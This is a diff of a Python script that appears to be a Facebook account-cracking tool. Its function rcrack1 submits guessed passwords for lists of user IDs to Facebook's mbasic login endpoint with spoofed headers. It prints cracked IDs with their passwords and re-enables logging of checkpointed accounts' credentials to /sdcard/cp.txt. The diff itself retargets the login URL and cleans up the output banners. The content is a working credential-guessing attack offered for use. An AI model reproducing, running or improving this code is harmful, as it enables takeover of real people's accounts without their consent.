@@ -319,8 +319,8 @@ logo = ("""
 \x1b[1;92m╔╩╦╝║╔╩╦╝║╣ ║║║║ ║║║║  
 \x1b[1;34m╩ ╚═╩╩ ╚═╚═╝╩ ╩╚═╝╝╚╝  
 \033[1;91m_______________________________
-\033[1;95mRANDOM 01867850909+01577019632
-\033[1;93m_______________________________
+\033[1;97mRANDOM 01867850909+01577019632
+\033[1;91m_______________________________
 """)                                              
 balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
 meyermarexudi =(""" \033[0;97m=============================================""")    
@@ -495,11 +495,11 @@ def rcrack1(uid,pwx,tl):
 
             session = requests.Session()
 
-            sys.stdout.write(f'\r\r\x1b[38;5;9m(%sTAMIM-XD\x1b[38;5;9m)\x1b[38;5;136m>•<\x1b[38;5;9m(\x1b[38;5;14m%s\x1b[38;5;9m)\x1b[38;5;136m>•<\x1b[38;5;9m(\x1b[38;5;11mOK\x1b[38;5;5m:\x1b[38;5;10m%s\x1b[38;5;9m) \033[1;37m'%(xi,loop,len(oks))),
+            sys.stdout.write(f'\r\033[\0[\x1b[\033[\033[1;91mOK] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
 
             sys.stdout.flush()
 
-            free_fb = session.get('https://m.alpha.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
 
             log_data = {
 
@@ -521,7 +521,7 @@ def rcrack1(uid,pwx,tl):
 
             "login":"Log In"}
 
-            header_freefb = {"authority": 'm.alpha.facebook.com',
+            header_freefb = {"authority": 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -543,7 +543,7 @@ def rcrack1(uid,pwx,tl):
            'upgrade-insecure-requests': '1',
            'user-agent': 'pro',
            'viewport-width': '980',}
-            lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
 
             log_cookies=session.cookies.get_dict().keys()
 
@@ -553,7 +553,7 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[7:22]
 
-                print(f"\033[38;5;46m[RED👙OK] {uid} | {ps}")
+                print(f"\033[38;5;46m[OK] {uid} | {ps}")
 
                 os.system('espeak -a 200 "CONGRATULATIONS"')
                 
@@ -573,7 +573,7 @@ def rcrack1(uid,pwx,tl):
 
                 print(f"\x1b[38;5;196m[X-CP🩸] {uid}|{ps} = \033[1;34m'+pro+'  \033[0;97m")
 
-               #open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
+               open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
 
                 cps.append(uid)
 
@@ -585,7 +585,7 @@ def rcrack1(uid,pwx,tl):
 
         loop+=1
 
-        sys.stdout.write(f'\r\033[\0[\x1b[\033[\033[1;91mRED👙OK] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[\0[\x1b[\033[\033[1;91mOK] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
 
         sys.stdout.flush()
 
